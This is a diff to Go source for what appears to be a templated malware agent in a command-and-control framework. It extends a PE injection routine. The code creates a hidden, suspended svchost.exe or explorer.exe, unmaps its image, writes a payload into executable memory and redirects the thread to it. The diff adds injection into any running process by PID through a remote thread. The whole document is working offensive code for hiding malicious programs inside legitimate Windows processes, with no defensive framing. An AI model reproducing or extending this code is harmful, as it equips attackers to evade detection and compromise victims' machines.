@@ -6,8 +6,8 @@ import (
 	"unsafe"
 )
 
-// PE injection functionality
-func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_PE_FUNC}(peData []byte) string {
+// PE injection functionality with PID parameter
+func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_PE_FUNC}_with_pid(peData []byte, pid uint32) string {
 	if len(peData) < 1024 { // Minimum size check
 		return "[ERROR] PE file too small to be valid"
 	}
@@ -66,56 +66,70 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_PE_FUNC}(peData []byte) string {
 		return "[ERROR] Unsupported architecture"
 	}
 
-	// Create target process in suspended state
-	targetPath, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\svchost.exe")
-	var si STARTUPINFO
 	var pi PROCESS_INFORMATION
-	si.Cb = uint32(unsafe.Sizeof(si))
-	si.Flags = 0x1        // STARTF_USESHOWWINDOW
-	si.ShowWindow = 0     // SW_HIDE (hidden)
 
-	// Command line needed for svchost.exe to work properly
-	cmdLine, _ := syscall.UTF16PtrFromString("svchost.exe -k netsvcs -s BITS")
+	if pid == 0 {
+		// No PID provided, create a new target process (original behavior)
+		// Create target process in suspended state
+		targetPath, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\svchost.exe")
+		var si STARTUPINFO
+		si.Cb = uint32(unsafe.Sizeof(si))
+		si.Flags = 0x1        // STARTF_USESHOWWINDOW
+		si.ShowWindow = 0     // SW_HIDE (hidden)
 
-	err := createProcess(
-		targetPath, // Path to target process
-		cmdLine,    // Command line (needed for svchost.exe)
-		nil,        // Process attributes
-		nil,        // Thread attributes
-		false,      // Inherit handles
-		0x4,        // CREATE_SUSPENDED flag
-		0,          // Environment
-		nil,        // Current directory
-		&si,        // Startup info
-		&pi,        // Process information
-	)
+		// Command line needed for svchost.exe to work properly
+		cmdLine, _ := syscall.UTF16PtrFromString("svchost.exe -k netsvcs -s BITS")
 
-	// If svchost.exe fails, fallback to explorer.exe
-	if err != nil {
-		targetPath, _ = syscall.UTF16PtrFromString("C:\\Windows\\explorer.exe")
-		cmdLine, _ = syscall.UTF16PtrFromString("explorer.exe")
-		err = createProcess(
-			targetPath,
-			cmdLine,
-			nil,
-			nil,
-			false,
-			0x4,
-			0,
-			nil,
-			&si,
-			&pi,
+		err := createProcess(
+			targetPath, // Path to target process
+			cmdLine,    // Command line (needed for svchost.exe)
+			nil,        // Process attributes
+			nil,        // Thread attributes
+			false,      // Inherit handles
+			0x4,        // CREATE_SUSPENDED flag
+			0,          // Environment
+			nil,        // Current directory
+			&si,        // Startup info
+			&pi,        // Process information
 		)
 
+		// If svchost.exe fails, fallback to explorer.exe
 		if err != nil {
-			return fmt.Sprintf("[ERROR] Failed to create suspended target process (svchost.exe or explorer.exe): %v", err)
+			targetPath, _ = syscall.UTF16PtrFromString("C:\\Windows\\explorer.exe")
+			cmdLine, _ = syscall.UTF16PtrFromString("explorer.exe")
+			err = createProcess(
+				targetPath,
+				cmdLine,
+				nil,
+				nil,
+				false,
+				0x4,
+				0,
+				nil,
+				&si,
+				&pi,
+			)
+
+			if err != nil {
+				return fmt.Sprintf("[ERROR] Failed to create suspended target process (svchost.exe or explorer.exe): %v", err)
+			}
 		}
+	} else {
+		// PID provided, open the existing process
+		pi.Process = openProcess(PROCESS_ALL_ACCESS, 0, pid)
+		if pi.Process == 0 {
+			return fmt.Sprintf("[ERROR] Failed to open target process with PID: %d", pid)
+		}
+		// For existing process injection, we don't have thread info yet,
+		// so we'll get it after injection
 	}
 
-	// Unmap the target process memory
-	result := ntUnmapViewOfSection(pi.Process, uintptr(imageBase))
-	if result != 0 {
-		// Continue execution anyway as this might not be critical
+	// Unmap the target process memory (only for newly created processes)
+	if pid == 0 {
+		result := ntUnmapViewOfSection(pi.Process, uintptr(imageBase))
+		if result != 0 {
+			// Continue execution anyway as this might not be critical
+		}
 	}
 
 	// Allocate memory in the target process for the PE file
@@ -124,41 +138,75 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_PE_FUNC}(peData []byte) string {
 		// Try without specifying base address
 		allocAddr = virtualAllocEx(pi.Process, 0, uintptr(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 		if allocAddr == 0 {
+			if pid != 0 {
+				closeHandle(pi.Process) // Clean up handle for existing process
+			}
 			return "[ERROR] Failed to allocate memory in target process"
 		}
-	} else {
 	}
 
 	// Write the PE headers to the allocated memory
 	var bytesWritten uintptr
 	success := writeProcessMemory(pi.Process, allocAddr, uintptr(unsafe.Pointer(&peData[0])), uintptr(len(peData)), &bytesWritten)
 	if !success {
+		if pid != 0 {
+			closeHandle(pi.Process) // Clean up handle for existing process
+		}
 		return "[ERROR] Failed to write PE headers to target process memory"
 	}
 
-	// Get the current thread context
-	var context CONTEXT
-	context.ContextFlags = 0x00000001 | 0x00000002 | 0x00000010 // CONTEXT_CONTROL | CONTEXT_INTEGER
-	err = getThreadContext(pi.Thread, &context)
-	if err != nil {
-		return fmt.Sprintf("[ERROR] Failed to get thread context: %v", err)
+	if pid == 0 {
+		// For newly created process, get thread context and update entry point
+		// Get the current thread context
+		var context CONTEXT
+		context.ContextFlags = 0x00000001 | 0x00000002 | 0x00000010 // CONTEXT_CONTROL | CONTEXT_INTEGER
+		err := getThreadContext(pi.Thread, &context)
+		if err != nil {
+			closeHandle(pi.Process)
+			closeHandle(pi.Thread)
+			return fmt.Sprintf("[ERROR] Failed to get thread context: %v", err)
+		}
+
+		// Update the entry point in the context
+		newEntryPoint := allocAddr + uintptr(entryPoint)
+		context.Rip = uint64(newEntryPoint) // For x64, update the instruction pointer
+
+		// Set the updated context
+		err = setThreadContext(pi.Thread, &context)
+		if err != nil {
+			closeHandle(pi.Process)
+			closeHandle(pi.Thread)
+			return fmt.Sprintf("[ERROR] Failed to set thread context: %v", err)
+		}
+
+		// Resume the target process thread
+		_, err = resumeThread(pi.Thread)
+		if err != nil {
+			closeHandle(pi.Process)
+			closeHandle(pi.Thread)
+			return fmt.Sprintf("[ERROR] Failed to resume target process thread: %v", err)
+		}
+
+		closeHandle(pi.Process)
+		closeHandle(pi.Thread)
+
+		return fmt.Sprintf("[SUCCESS] PE file injected and executed in process PID: %d, TID: %d", pi.ProcessId, pi.ThreadId)
+	} else {
+		// For existing process, we need to create a remote thread to execute the PE
+		var threadID uint32
+		threadHandle := createRemoteThread(pi.Process, 0, 0, allocAddr, 0, 0, &threadID)
+		if threadHandle != 0 {
+			closeHandle(threadHandle)
+			closeHandle(pi.Process) // Clean up process handle
+			return fmt.Sprintf("[SUCCESS] PE file injected into existing process PID: %d, thread ID: %d", pid, threadID)
+		} else {
+			closeHandle(pi.Process) // Clean up process handle
+			return fmt.Sprintf("[ERROR] Failed to create remote thread in process PID: %d", pid)
+		}
 	}
+}
 
-	// Update the entry point in the context
-	newEntryPoint := allocAddr + uintptr(entryPoint)
-	context.Rip = uint64(newEntryPoint) // For x64, update the instruction pointer
-
-	// Set the updated context
-	err = setThreadContext(pi.Thread, &context)
-	if err != nil {
-		return fmt.Sprintf("[ERROR] Failed to set thread context: %v", err)
-	}
-
-	// Resume the target process thread
-	_, err = resumeThread(pi.Thread)
-	if err != nil {
-		return fmt.Sprintf("[ERROR] Failed to resume target process thread: %v", err)
-	}
-
-	return fmt.Sprintf("[SUCCESS] PE file injected and executed in process PID: %d, TID: %d", pi.ProcessId, pi.ThreadId)
+// Original PE injection functionality (for backward compatibility)
+func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_PE_FUNC}(peData []byte) string {
+	return a.{AGENT_INJECT_PE_FUNC}_with_pid(peData, 0)
 }
